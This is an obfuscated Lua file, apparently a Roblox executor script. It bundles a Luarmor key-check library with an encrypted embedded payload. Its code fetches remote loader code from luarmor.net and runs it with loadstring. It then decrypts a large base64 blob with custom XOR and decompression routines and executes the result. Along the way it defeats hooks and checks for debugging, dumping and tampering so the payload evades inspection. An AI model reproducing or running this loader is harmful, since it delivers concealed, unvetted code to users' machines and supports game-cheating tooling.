                                                            --]                                                 
                                                                  --[]                                          
                                                                  --[]                                          
                                                local a;local b=--[]                                            
                                            (pcall(getfenv)and _G or _G)["This is t"..                          
                                             "he key check libr"..                                              
                                                                --                                              
                                          "ary used by Luarmor,"..                                              
                                           " documentation can be"..                                            
                                              " view"..   "ed at h"..                                           
                                              "ttps://docs.luarmor."..                                          
       "net/luarm"..                          "or-user-manual-and-"..                       "f.a.q#key"..       
     "-check-library"]    do                  local function c                  (d)       return d%--[[==]]     
    4294967296 end;                           local function e(          f,      g)      local h,i=0,1;while     
  f>0 or g>0 do local j=            f%2;      local k=g%2;if j~=       k then           h=h+i end;f=math.floor(   
  f/2)g=math.floor(g/2)i=i*         2         end;return h end;                     local function l(d,m)--[]]  
  return c(d   *2^m)end;local                 function n(d,m)                  return math.floor(   d/2^m)%--]  
  4294967296    end;function a(o)local   p={    [1]=0x5ad69b68,[2]=          0x03b7222a,[3]=--[[{]]   0x2d074df6  
  ,[4]=        0xcb4fff2d}local q={[1  ]=     0x01c3,[    2]=              0xa408,[3]=0x964d,[4]=   0x4320}--]  
  local r=#o   ;local s=1;while s<=r   do            local           t=0   ;for u=0,3 do local v=   s-1+u;if v  
  <r then      local w=o:byte(v+1)t=t  +w*2   ^(8*u)end end;t=c(t)   for    x=1,4 do local y=e(p[x   ],t)local   
  z=p[x%4+1]   y=e(y,z)y=  c(l(y,5)+n  (y,2   )+q[x])local A=(x-1)   *5%   32;local B  =n(t,A)y=e   (y,B)y=c(y  
  )local C=p   [(x+1)%4+1  ]y=c(y+C)p  [x]=   c(y)end;s=s+4 end;     for    x=1,4 do    local y=p[   x]local D=  
  p[x%4+1]     local E=p[  (x+2)%4+1]  y=c(   y+D)y=e(y,E)local A=   x*7   %32;y=c(l(  y,A)+n(y,    32-A))p[x]  
  =y end;      local F={}  for x=1,4   do F   [x]=string.format(           "%08X",p[x  ])end;       return --]  
  table.       concat(F)   end end;           local G;local H=game and game.GetService and game:GetService("HttpS".."ervice")or{}
  local        function I  (J)return    H:    JSONDecode(J)end;            local K=    syn and      syn.--[[]]  
  request or    request or   --[[: or]]         http_request;local           function L  (M)local N   =os.time()  
  M=tostring   (M)G=       tostring(G   )     local O=K({Method=    ""..   "GET",Url=  "https:"..   "//sdka"..  
  "pi-pub"..   "lic.lu"..  "armor."..   "n"..  "et/sync"})O=I(O.   Body)   local P=O.  nodes;       local Q=P[  
  math.        random(1,#  P)]local R    =Q..   "check_key?key="   ..M     .."&scr"..  "ipt_id="    ..G;local   
  S=O.st;      local T=S-  N;N=N+T;O=     K({    Method="GET",    Url=     R,Headers=  {["clie"..   "nttime"]=  
  ""..N,[      "catcat"..  "128"]=a(M      ..     "_cfver1.0_"   ..G       .."_time_"  ..N)}})      return I(O  
  .Body)end;   local       function U       ()G=    tostring   (G)if        not G:      match(""..   "^[a-f0"..  
  "-9]{32}$"   )then       return end        ;                pcall        (writefile  ,G.."-c"..   "ache.lua"  
  ,"recac"..   "he is "..  "requi"..          "red")        wait(          0.1)pcall(  delfile,G    .."-cac"..  
  "he.lua")    end;local   function             V()      --[[+]]            --[[for]]  loadstring   (game:--[]  
  HttpGet(     "https:"..  "//ap"..        ""..   "i.luarmo"..               "r.ne"..  "t/file"..   "s/v3/l"..  
  "oaders/"    ..--[[,]]   --[[/]]                   --[[]]                   --[[%]]  tostring(G   )..".lua")  
  )()end;
local p="ZzrafS1HtoUN".."ezsNk523O47k".."GAG5fxXhTLEk".."xmEUKi+CTxCV".."uFgqhmj9fQfC".."FUXBIlEySATz".."+uNdArEqYBOE".."YSZqfXdwt26C".."N1pYQsawq48J".."lHf1JvmxPDP6".."kdOcYyFRRQN5".."vw8thGBOn56M".."gFduUsT9IdzW".."gIVaf9yXHfQS".."mw4C3KgNtJyt".."HkKtSIYHN852".."K1alk0wyV3GJ".."TMeIgHy1PHY1".."Jgu469Q9+iUB".."w9YcTsDYIeR3".."MqHrDZ9YHzmL".."f10D4CZgO8ml".."F5LLX0FTC2J8".."RuZh6jTwCJP1".."1+lpObatTkoF".."ZzCeDihj0Aze".."AoqC7WS+o1bc".."fx9MhVwhaqkB".."fkFBVSvutMYQ".."l6HcIUEctuax".."4m5VDPDrz7bc".."i5ZEbW8JOTVp".."f7LJ2onnIWue".."hn0sacaUi/ZB".."fnewJ3xestcC".."TEl3k5PqXhsR".."xGYqL/hFApWp".."wlgqFJUD23i5".."vGDGFS1wfGsW".."XlSUR/+Mmn97".."BaZGrHX7rr8C".."0bskEBjdWwgt".."mZgzpExC6DVG".."IDf/bjYkdftJ".."JQHpRDiApVYo".."5fGGfpn3alym".."PvSYtEioNvXB".."OIM2KE5RlQFm".."nbh0yuybem7g".."X3RIuXgmK/jh".."uhVPvw2VIKAN".."AXkTJ9dfxEJo".."1qHeopD4dKg5".."qqtroMdhTPZS".."Jx/a3L8Ye3TP".."FlfLGu4qQmJ6".."ypAcv6No8DwK".."Yek33HtRlDxJ".."VAP4XcP49MuY".."J0MagwdAlbg+".."V8ZsZ7NKCYKc".."T1mKRNUqykKJ".."dyOmLkGcNYbZ".."TFyDO0Rsy+67".."dThTAZGeDbCB".."7ZZm6SBhMBgB".."Og9I4uNvgW8Y".."RVHqdkhCyRrZ".."vbP18UMZMCFP".."pavQ0fWkOwTt".."TIqmwlytBlR8".."lAfjsPkJFZM6".."DFvZHiwPFg2T".."xeH/Aew7RWoX".."mlKUy+vfQU9a".."yBXSaN2wnC+E".."XAtxZbA5JRzL".."2BoPZAGeVUVi".."yR02+xcXBzhh".."CgfCQdsijWcr".."KOxv3WdQIi+u".."EmbvyQ9lmXTY".."JGONEXcamkP4".."WA8K1E8tSoJ+".."wzMRS+4fJVWA".."lc+lj9kCekiZ".."aLkv0j13tVwL".."f71JjRP3vB7g".."os7ZBXTB4qgc".."gs2opJh6sT4w".."Dtq8+OvHbsPH".."j3uxyvLX55BX".."ZUil9bgMAx3a".."+shzwBmz/Sgm".."gU0dZdUtgb+B".."XOkOHn2LYgGX".."Y2CAawsW5Vwl".."TwUiXFVpMI1t".."7sxNMxc7tJHS".."+PjkVvuW0qln".."D3UStuj97uf/".."SRT4zTVOJR3s".."cv86Zvd0GJ62".."g4g7MtmMRf9M".."1kLxWu3XrM3u".."xEyE9tg6jQ+I".."dTLAWzZKtU8I".."p+cQxU34s2Fy".."zZZkUYAeuFiU".."36XG746LTF7K".."Tml0xTl9jpTc".."XIlI9lxd83OE".."+mWvoGzM0bgZ".."s3MTmKcn5+n6".."Gr3tYN34hOaM".."mwfYgf88wQJB".."yVZ1OZBs3tz8".."ysB0bgvm9S3s".."1uPD1jUgSy3J".."3BNtbluVhIgc".."GlP4Wm9PlzZc".."8wkWeAbVsU9Y".."dvDHIrjX7dJj".."nA2CYie4x4qR".."P8KuJBdbjEs4".."jF64LplWfdV2".."JSrC0HMr8r1t".."ufuJOc9eCzzQ".."Ramjx01q/rui".."4D3q2F9V+HfP".."PhAPn93qBhVF".."0jpjT6/OqQwR".."XBUSSN84Q3/J".."zL7B57TJciFy".."i0qt3nNTyxgy".."X+MrmBvjhALW".."xfU+M5bw8vI0".."yuqxV3gkgHdz".."oGBYLZCY1UVg".."S/H0ZEG5g+FB".."IE+CGEE76f82".."X3s8A6A0V6V4".."4Iu51HF8Em2s".."ZhDLl5CHXA9v".."YFwthNR8vQVt".."8amr02afrAYI".."i/PHJYWwpuNH".."ndmThc2zi+yX".."asmw5vU+8kQS".."GPWg6WDTywSA".."09YBGIrkOsUE".."yYBraGH8tZCk".."BuHThIuS8rpX".."GW+k2L+6d++a".."cFCyOHDgXVkI".."sp98vT9398Ul".."Q22c3bIDULoU".."6oIN/wzFRVAR".."6FjedqCb+Q57".."Q62F+nrbhPao".."vtrA2X0kD+AV".."gXsAw9WiJyED".."5QYmDfZoDmo5".."GYxZNRvv37ow".."ASiidFYWEcOE".."9uzRXPGB0yfo".."ceXNpz7ZrIxl".."aDvQ+Otz6pup".."oYRJ2iY29+jV".."mIlAJvfVlB7b".."GN2iGSjsZ6Lq".."uY3WxwGToKdj".."wXoHQ0qZXHFw".."Zv8JIlCEjKF/".."ueR72xtyiDqs".."8+bW1tR1Na96".."0zclcbamD5o/".."3BBqYCHIVy+J".."TGkxQw8HHqfL".."R5tXzu3w7Qhi".."2/iInFq91oCP".."cNadjd9qQUs0".."O4jxR4prJsnw".."hUWa01sS+Ciz".."5oV2xp2xu/pw".."UCikkCyg0yUV".."nFvYW4OPzFqo".."hm74pZPO6L8Z".."Lnk+3sD7Y4HR".."vu8foU9mCRIi".."mCsgIvMFhrNF".."Wz5VbZI6HYVR".."b6IxA5IcKhaJ".."ZH85KTDxJ1FI".."OmGokXR4DLDc".."tn/gcg94qavi".."DZbEoIG31WAE".."DvYGb/DDOZ7z".."3NQSt44PJDGV".."9Mj9CKCiBDTt".."TI2Hy1OilPjj".."yKwbeBuCfFdo".."cRxw+pSRuKjN".."9zkuQOTm9wzH".."/lGZu91ZSh/y".."XBZeUBZ93u2R".."CODNpIRYwiQo".."cc57F1aBeOln".."WSONcP6ysFny".."Ez1gdMC4Gvoo".."+1hVCPxKNo5V".."FawdD2+OM5Tv".."HMW3e1TST0ni".."s8H8Eayw4vFK".."aMwprE9+nBJl".."aVbIwZ0D59n+".."GtyOD/nWs25E".."bUKhM3BbqXDk".."pMjDAXfZJDuR".."RDAfHt94Bf/B".."Lbz68D6aKXKN".."67lVI6MMAZfN".."44dOsIF7xZkb".."QWcO5TS/JsYO".."mlCkinaRkBcP".."OXTYg+1LpiC/".."CQe41eq+fLuC".."BRwLY/JNGfU8".."cgnD68WwZVL3".."57/FEsi9BmJs".."uR54bEdw3Krv".."txhp+saWiADO".."NAzXSH/bIB+b".."A2Ru8RklUexn".."rOZ63c2YT0v8".."9mZp+kd2GgFT".."i4UxsffKBfBt".."2s3Zh4Mnn1cQ".."GBHqB1IAt5Bb".."6bUARVfxi9/g".."OjEIm0Q9nwNB".."xViuCFJYhTyf".."qczWa/5aQgPA".."FH9arW2wdIay".."GtTsuH67DJfd".."MZkLJU2Mhynu".."wCmYLSJIU5bh".."KdbLL+WYrlCQ".."3f/R9mpqBy3E".."F6Aq7LAfPAAL".."IedlygvfqjHq".."CMh+VEmsESzq".."CuSXiczfVCpi".."mwOZTB23OswG".."ZAdpNRZLU2XJ".."qvZQ+aFdYsGi".."jv9nb+vWJDaM".."WqrrEMGsICkA".."csbJ8S+y91WD".."S+6a3tQes4X7".."A+ZDMQloo0jp".."rH4Dg63FurCn".."JhAZWTa0l8ha".."8IQdNDN2n5Ty".."LCOf3z3mVCVm".."BAEUKxIRVYRk".."ZzHD3JT/zCeS".."Bh9CUvePNdfF".."A4fK0AnzoTfv".."A7N0KQwY+YvW".."zvJGtpMe8A9P".."1iMj5HZePYd6".."N5iL+4YaIU6C".."WOtsh6UOppsX".."oq0RPipecnP2".."NqSVzyTax1ms".."xpuW648FV9pL".."L2zWGTFuaFVX".."Hu2xnnRA2q61".."+KQydwwRwWIE".."KJUVyUWXdB1t".."FOzGUlSo0Sz9".."hwqf++wcMezP".."MFOHajFI1tW2".."Lop0OtfabooO".."MOISjlyFzPn1".."yVos8nDu/b9U".."oChoRylMNnJy".."xWz/vCxt5VSu".."m0OQ0XGCrfeO".."vYY12Jp2NKli".."lFSS4IOmemlj".."Sw/WPrPoO/Rs".."GgcihVHW3JXI".."MwbTWEopOoCw".."09k0U4r54ASp".."0WFasCaGyMUq".."I2sRPyue4+So".."TVxiOIS4B3AE".."nCzxeiLXiwrB".."tJp0wUU4yTGd".."Sg2zdIXRq5dk".."qbmU3wsPq2xF".."YbhOUDnv7IVA".."QBhjrbUjqdfp".."ilrdSZZ+ZizB".."jgWD5L7k6SJx".."NEzDAcSyqxfE".."QnqqPeXg/DyA".."R3cadFCKcbGy".."JB0aMYwi2poq".."xrTQ/Q291O3v".."coPwsKSaDM5A".."Tdk3B0VTVwom".."xhw5t95SEYSQ".."0n4p/QlM8/i8".."yX93Mg"
local q={0x60,0x42,0x96,0xcd,0x9b,0xe4,0x11,0x5b}
local function hk(fn)
if type(fn)~="function" then return false end
if type(isfunctionhooked)=="function" then local ok,h=pcall(isfunctionhooked,fn) if ok and h then return false end end
if type(iscclosure)=="function" and type(islclosure)=="function" then local cOk,c=pcall(iscclosure,fn) local lOk,l=pcall(islclosure,fn) if cOk and lOk and l and not c then return false end end
if debug and type(debug.info)=="function" then local ok,src=pcall(debug.info,fn,"s") if ok and type(src)=="string" and src~="[C]" and src~="=[C]" then return false end end
return false
end
if hk(string.char) or hk(string.byte) or hk(table.concat) or hk(math.floor) or hk(pcall) then error("ho".."ok") end
local sc=string.char local sb=string.byte local tc=table.concat local mf=math.floor local ss=string.sub
local function ee(f,g) local h,i=0,1 while f>0 or g>0 do local j,k=f%2,g%2 if j~=k then h=h+i end f=mf(f/2) g=mf(g/2) i=i*2 end return h end
local SA=105 local MK=196
local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" local T={} local ti=1 while ti<=64 do T[sb(B,ti)]=ti-1 ti=ti+1 end
local function d1(s) local o,v,n,i={},0,0,1 while i<=#s do local z=T[sb(s,i)] i=i+1 if z~=nil then v=v*64+z n=n+1 if n==4 then o[#o+1]=sc(mf(v/65536)%256) o[#o+1]=sc(mf(v/256)%256) o[#o+1]=sc(v%256) v=0 n=0 end end end if n==2 then o[#o+1]=sc(mf(v/16)%256) elseif n==3 then v=v*64 o[#o+1]=sc(mf(v/65536)%256) o[#o+1]=sc(mf(v/256)%256) end return tc(o) end
local function d2(src) local o={} local i=1 local n=#src while i<=n do local flags=sb(src,i) i=i+1 local bit=0 while bit<8 and i<=n do if mf(flags/2^bit)%2==1 then local dist=sb(src,i) local len=sb(src,i+1)+3 i=i+2 local base=#o-dist local k=1 while k<=len do o[#o+1]=o[base+k] k=k+1 end else o[#o+1]=sc(sb(src,i)) i=i+1 end bit=bit+1 end end return tc(o) end
local function d3(s) local n=0 local i=1 while i<=#s do n=(n*131+sb(s,i))%4294967296 i=i+1 end return n end
local function d4(R) local o={} local bi=0 local prev=SA local n=#R while bi<n do local by=sb(R,bi+1) local kb=ee(q[(bi%#q)+1],(MK+(bi%8)*17)%256) local cur=by by=ee(by,prev) prev=cur local add=(bi*13+SA)%256 by=(by-add)%256 by=ee(by,kb) o[#o+1]=sc(by) bi=bi+1 end return tc(o) end
if hk(sc) or hk(sb) or hk(tc) then error("du".."mp") end
local r1=d4(d1(p))
local s1=sb(r1,1)==1 and d2(ss(r1,2)) or ss(r1,2)
if d3(s1)~=3718943538 then s1=nil error("anti tamper") end
local function EX() if type(getgenv)=="function" then local ok,e=pcall(getgenv) if ok and type(e)=="table" then return e end end if type(getfenv)=="function" then local ok,e=pcall(getfenv) if ok and type(e)=="table" then return e end end return _G end
local E=EX()
local function raw()
local fn=loadstring or load
if type(E.loadstring)=="function" then fn=E.loadstring end
if type(fn)~="function" and type(E.load)=="function" then fn=E.load end
if type(restorefunction)=="function" and type(clonefunction)=="function" then local ok,clean=pcall(function()
if type(loadstring)=="function" then local prev=loadstring restorefunction(loadstring) local copy=clonefunction(loadstring) if type(hookfunction)=="function" and prev~=loadstring then hookfunction(loadstring,prev) end return copy end
if type(load)=="function" then local prev=load restorefunction(load) local copy=clonefunction(load) if type(hookfunction)=="function" and prev~=load then hookfunction(load,prev) end return copy end
end) if ok and type(clean)=="function" then fn=clean end end
return fn
end
local fn=raw()
local function trapped(fn)
if type(fn)~="function" then return false end
if type(isfunctionhooked)=="function" then local ok,h=pcall(isfunctionhooked,fn) if ok and h then return true end end
if debug and type(debug.getinfo)=="function" then local ok,info=pcall(debug.getinfo,fn,"S") if ok and type(info)=="table" and info.what=="Lua" then return true end end
if debug and type(debug.info)=="function" then local ok,src=pcall(debug.info,fn,"s") if ok and type(src)=="string" and src~="[C]" and src~="=[C]" then return true end end
return false
end
local ls=loadstring or load
if type(E.loadstring)=="function" then ls=E.loadstring end
if trapped(ls) then s1=nil r1=nil p=nil error("anti tamper") end
if type(fn)~="function" then error("com".."pile") end
local g=fn(s1)
s1=nil r1=nil p=nil
if type(g)~="function" then error("com".."pile") end
if type(setfenv)=="function" and (E.game~=nil or type(E.string)=="table") then pcall(setfenv,g,E) end
g()
return      --[[]]           --[[% ]]        --[[# ]]           --[[]]   --[[<= ]]   --[[<= +]]  
  --[[} ; ]]   --[[+ ]]                     --[[/ ]]        --[[==]]                     --[[==]]   --[[{ ( ]]  
  --[[^ ; ]]   --[[~=]]                                                                  --[[* ]]   --[[do #]]  
  --[[^ do]]   --[[]]                                                                      --[[]]   --[[goto]]  
  --[[+ do]]                                                                                        --[[~= /]]  
  --[[} % ]]                              setmetatable(  {},{__index=                               function(W  
  ,X)local Y   =                    a(X)if Y=="3"..          "0F75B193B94"..                        "8B4E96"..  
  "514636"..                      "5A85CBCC"then                 return L end;                       if Y==""..  
  "2BCEA"..                             "36EB"..                "24E2"..                             "50BBA"..  
  "B188"..                            "C"..                          "7"..                            "3A74"..  
  "DF10"                                                               then                            return U   
  end;if                               Y==                                                               "75"..  
  "6"..                                                                                                  "2"..  
                                                                                                                
"4F56542822D214B1FE25E8798CC6"then return V end;return nil end,__newindex=function(W,Z,_)if Z=="script_id"then G=_ end end})

--[[sitar:v1]]
